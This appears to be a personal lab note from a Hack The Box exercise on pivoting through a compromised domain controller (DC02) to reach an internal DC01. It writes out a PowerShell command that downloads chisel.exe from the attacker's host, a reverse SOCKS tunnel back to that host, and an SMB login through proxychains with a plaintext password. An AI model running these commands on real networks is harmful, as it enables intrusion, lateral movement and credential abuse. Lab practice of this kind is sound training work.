🔍 DC02 is on an internal network `172.16.20.0/24` with DC01 at `172.16.20.1` as the gateway!

This means DC02 bridges your HTB network and the internal network. We need to pivot through DC02 to reach DC01 internally.

#powershell_DC2 
### 1. Confirm DC01 is at 172.16.20.1

```powershell
ping -n 2 172.16.20.1
```

![[Screenshot_2026-03-24_11-41-07.png]]

### 2. Set Up a Proxy via DC02 — On Kali

Upload chisel to DC02 for tunneling:

#Attacking_machine 

```bash
# On Kali — install chisel
sudo apt install chisel -y 
which chisel

# Start chisel server on Kali
./chisel server -p 8000 --reverse
```

### 3. Upload Chisel to DC02

powershell

```powershell
# On DC02 shell
powershell -c "IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.36:8080/chisel.exe','C:\Windows\Temp\chisel.exe')"
```

Serve it first on Kali:

bash

```bash
python3 -m http.server 8080
```

### 4. Connect Back from DC02

powershell

```powershell
C:\Windows\Temp\chisel.exe client 10.10.14.36:8000 R:socks
```

### 5. Route Traffic Through the Tunnel

bash

```bash
# Add to /etc/proxychains4.conf
socks5 127.0.0.1 1080

# Then access DC01 internal IP
proxychains netexec smb 172.16.20.1 -u 'john.w' -p 'RFulUtONCOL!'
```

---

💡 **This is the pivot point** — DC01 at `172.16.20.1` may have different services exposed internally than what we saw externally. Start the chisel server on Kali and let's tunnel through DC02! 🎯